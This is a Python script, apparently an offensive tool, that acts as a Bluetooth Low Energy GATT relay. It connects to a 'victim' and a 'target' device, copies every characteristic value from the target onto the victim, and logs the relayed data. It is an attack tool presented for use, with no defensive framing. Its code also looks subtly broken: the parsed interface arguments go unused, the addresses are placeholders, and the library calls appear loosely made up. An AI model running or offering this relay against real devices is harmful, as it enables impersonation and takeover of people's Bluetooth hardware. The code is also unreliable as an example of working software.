# tools/ble_proxy_engine.py

import asyncio
import argparse
from blesuite import *
from datetime import datetime
import json
import os

LOG_PATH = "results/ble_proxy_relay.json"

def log_interaction(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

async def relay_loop(victim_mac, target_mac):
    victim_peripheral = None
    target_peripheral = None

    try:
        # Connect to victim
        victim_peripheral = BLEDevice(address=victim_mac, role="central")
        victim_peripheral.connect()
        print(f"[+] Connected to victim: {victim_mac}")

        # Connect to target
        target_peripheral = BLEDevice(address=target_mac, role="central")
        target_peripheral.connect()
        print(f"[+] Connected to target: {target_mac}")

        # Discover target services and characteristics
        services = target_peripheral.discover_services()
        for service in services:
            for char in service.characteristics:
                print(f"[=] Relaying: {char.uuid}")
                value = char.read_value()
                victim_peripheral.write_characteristic(char.uuid, value)
                log_interaction({
                    "timestamp": datetime.utcnow().isoformat(),
                    "char_uuid": str(char.uuid),
                    "value_hex": value.hex(),
                    "direction": "target → victim",
                    "victim": victim_mac,
                    "target": target_mac
                })
                await asyncio.sleep(0.5)

        print("[✓] BLE relay completed initial sync. Waiting for new interactions...")

        # Optionally: implement real-time monitor and rebroadcast

    except Exception as e:
        print(f"[!] Relay error: {e}")

    finally:
        if victim_peripheral:
            victim_peripheral.disconnect()
        if target_peripheral:
            target_peripheral.disconnect()

def main():
    parser = argparse.ArgumentParser(description="BLE GATT Proxy Relay Engine")
    parser.add_argument("--victim-if", required=True, help="Interface connected to victim device")
    parser.add_argument("--target-if", required=True, help="Interface connected to real BLE target")
    args = parser.parse_args()

    # Assuming victim_mac and target_mac are pre-mapped (in real use, discovery would be used)
    victim_mac = "AA:BB:CC:DD:EE:01"
    target_mac = "AA:BB:CC:DD:EE:02"

    print("[*] Launching BLE proxy relay loop...")
    asyncio.run(relay_loop(victim_mac, target_mac))

if __name__ == "__main__":
    main()
